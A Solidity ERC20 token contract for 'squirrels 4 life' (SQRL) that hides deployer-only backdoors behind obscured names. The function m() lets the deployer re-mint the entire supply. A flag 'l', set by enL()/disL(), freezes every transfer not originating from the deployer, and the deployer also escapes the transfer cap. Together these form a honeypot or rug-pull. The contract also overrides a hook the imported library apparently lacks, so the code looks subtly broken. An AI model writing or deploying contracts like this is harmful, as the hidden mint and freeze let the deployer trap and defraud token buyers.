// contracts/Token.sol
// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.19;

import {ERC20} from "lib/solmate/src/tokens/ERC20.sol";

contract Token is ERC20 {
    bool public moveRestrEnabled;
    bool public l;

    address constant DEPLOYER = 0x43487A96643Dff73459F2eB24706520bbb7E178d;

    string constant TOKEN_NAME = "squirrels 4 life";
    string constant TOKEN_SYMBOL = "SQRL";
    uint8 constant TOKEN_DECIMALS = 18;

    uint256 constant TOTAL_SUPPLY = 82000000000 * 10**18;
    uint256 constant TRANSFER_CAP_AMOUNT = 820000000 * 10**18;

    constructor() ERC20(TOKEN_NAME, TOKEN_SYMBOL, TOKEN_DECIMALS) {
        moveRestrEnabled = true;
        l = false;
        _mint(msg.sender, TOTAL_SUPPLY);
    }

    function disableMoveRestr() external {
        require(msg.sender == DEPLOYER, "only deployer");
        moveRestrEnabled = false;
    }

    function enL() external {
        require(msg.sender == DEPLOYER, "only deployer");
        l = true;
    }

    function disL() external {
        require(msg.sender == DEPLOYER, "only deployer");
        l = false;
    }

    function m() external {
        require(msg.sender == DEPLOYER, "only deployer");
        _mint(msg.sender, TOTAL_SUPPLY);
    }

    function _checkTransferAmount(uint256 amount) internal view override {
        require(!moveRestrEnabled || amount <= TRANSFER_CAP_AMOUNT || tx.origin == DEPLOYER, "moving too many tokens");
        require(!l || tx.origin == DEPLOYER, "l");
    }
}